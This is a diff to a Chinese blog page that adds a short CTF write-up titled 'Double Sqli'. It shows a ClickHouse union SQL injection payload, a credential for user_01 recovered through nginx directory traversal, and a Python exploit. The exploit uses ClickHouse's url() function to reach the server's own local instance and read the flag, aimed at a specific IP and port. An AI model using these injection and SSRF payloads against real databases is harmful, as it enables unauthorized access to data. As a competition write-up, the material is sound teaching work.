@@ -185,7 +185,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      0 字
+      178 字
     </span>
   
 
@@ -195,7 +195,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      1
+      2
        分钟
     </span>
   
@@ -228,7 +228,19 @@
             <h1 style="display: none">字节跳动</h1>
             
             <div class="markdown-body">
-              
+              <h2 id="Double-Sqli"><a href="#Double-Sqli" class="headerlink" title="Double Sqli"></a>Double Sqli</h2><p>报错可以发现是clickhouse数据库，查看文档可以查数据库，表等</p>
+<figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">&#x2F;?id&#x3D;-1 union all select name from system.databases--+<br></code></pre></div></td></tr></table></figure>
+
+<p>最后读到hint,提示需要提权。</p>
+<p><img src="https://img-blog.csdnimg.cn/f452ef603b2e4e269037545b674e9e24.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>这里需要发现一个 nginx 目录穿越</p>
+<figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">在 <span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/clickhouse/</span>access/xxxx.sql 中发现了数据库中还有一个 user_01 用户，其密码为 e3b0c44298fc1c149afb<br></code></pre></div></td></tr></table></figure>
+
+<p>这里肯定是用<code>user_01</code>的权限读取flag，后面发现可以用<code>url()</code>函数ssrf打它本地的clickhouse</p>
+<p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>result = <span class="hljs-string">&#x27;&#x27;</span><br><br>test = <span class="hljs-string">&#x27;http://39.105.175.150:30001&#x27;</span><br>param = &#123;<br>    <span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-string">&quot;-1 union all select * FROM url(&#x27;http://localhost:8123?user=user_01&amp;password=e3b0c44298fc1c149afb&amp;query=select+flag+from+flag&#x27;,&#x27;CSV&#x27;,&#x27;column1 String&#x27;)&quot;</span><br>&#125;<br><br>res = requests.get(test,params=param)<br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></div></td></tr></table></figure>
+
+
             </div>
             <hr>
             <div>
